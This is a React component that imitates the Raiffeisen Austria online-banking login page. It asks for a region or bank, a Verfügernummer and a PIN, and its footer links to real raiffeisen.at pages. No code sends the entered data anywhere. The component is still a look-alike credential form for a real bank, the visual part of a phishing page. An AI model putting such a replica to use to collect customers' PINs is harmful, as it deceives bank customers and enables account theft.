import { useState } from "react";
import bgImage from "@/assets/rbg_wald.jpg";

const bundeslaender = [
  "Burgenland",
  "Kärnten",
  "Niederösterreich/Wien",
  "Oberösterreich",
  "Salzburg",
  "Steiermark",
  "Tirol",
  "Vorarlberg",
  "Oberösterreich/Bank Direkt",
  "Oberösterreich/PRIVAT BANK",
  "Tirol/Jungholz",
  "Alpen Privatbank",
];

const Raiffeisenbank = () => {
  const [bundesland, setBundesland] = useState("");
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [selectOpen, setSelectOpen] = useState(false);
  const [selectFocused, setSelectFocused] = useState(false);

  const selectHasValue = bundesland !== "";
  const selectLabelFloated = selectOpen || selectFocused || selectHasValue;

  return (
    <div
      className="relative flex min-h-screen flex-col items-center justify-center"
      style={{
        fontFamily: "'Open Sans', sans-serif",
        backgroundImage: `url(${bgImage})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundAttachment: "fixed",
      }}
    >
      {/* Login Card */}
      <div className="relative z-10 w-full max-w-md rounded-lg bg-white p-8 shadow-lg">
        <h1 className="mb-2 text-xl font-bold text-[#1a1a1a]">
          Bitte melden Sie sich an
        </h1>
        <p className="mb-6 text-sm text-gray-500">
          Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
        </p>

        {/* Bundesland Select - Floating Label */}
        <div className="relative mb-4">
          <label
            className={`pointer-events-none absolute left-3 transition-all duration-200 ${
              selectLabelFloated
                ? "top-1 text-xs text-gray-500"
                : "top-3 text-sm text-gray-500"
            }`}
          >
            Bundesland oder Bank wählen <span className="text-gray-400">*</span>
          </label>
          <select
            value={bundesland}
            onChange={(e) => setBundesland(e.target.value)}
            onFocus={() => setSelectFocused(true)}
            onBlur={() => setSelectFocused(false)}
            className="w-full appearance-none border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
          >
            <option value="" disabled hidden></option>
            {bundeslaender.map((bl) => (
              <option key={bl} value={bl}>
                {bl}
              </option>
            ))}
          </select>
          <div className="pointer-events-none absolute right-0 top-4">
            <svg className="h-4 w-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
            </svg>
          </div>
        </div>

        {/* Verfügernummer - Floating Label */}
        <div className="relative mb-4">
          <input
            type="text"
            value={verfueger}
            onChange={(e) => setVerfueger(e.target.value)}
            placeholder=" "
            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
          />
          <label className="pointer-events-none absolute left-0 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
            Verfügernummer eingeben <span className="text-gray-400">*</span>
          </label>
        </div>

        {/* PIN - Floating Label */}
        <div className="relative mb-6">
          <input
            type="password"
            maxLength={5}
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            placeholder=" "
            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
          />
          <label className="pointer-events-none absolute left-0 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
            PIN eingeben <span className="text-gray-400">*</span>
          </label>
        </div>

        {/* Weiter Button */}
        <button
          type="button"
          className="w-full rounded-md bg-[#FFC72C] py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6b325] disabled:opacity-50"
          disabled={!bundesland || !verfueger || !pin}
        >
          Weiter
        </button>
      </div>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 z-10 py-4">
        <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
          <a
            href="https://raiffeisen.at/de/online-banking/login/impressum.html"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:underline"
          >
            Impressum
          </a>
          <a
            href="https://raiffeisen.at/de/online-banking/login/nutzungsbedingungen.html"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:underline"
          >
            Nutzungsbedingungen
          </a>
          <a
            href="https://raiffeisen.at/de/meine-bank/kundenservice/barrierefreiheit/barrierefreiheitserklaerung.html"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:underline"
          >
            Barrierefreiheitserklärung
          </a>
          <span>© 2026 Raiffeisen</span>
        </div>
      </footer>
    </div>
  );
};

export default Raiffeisenbank;
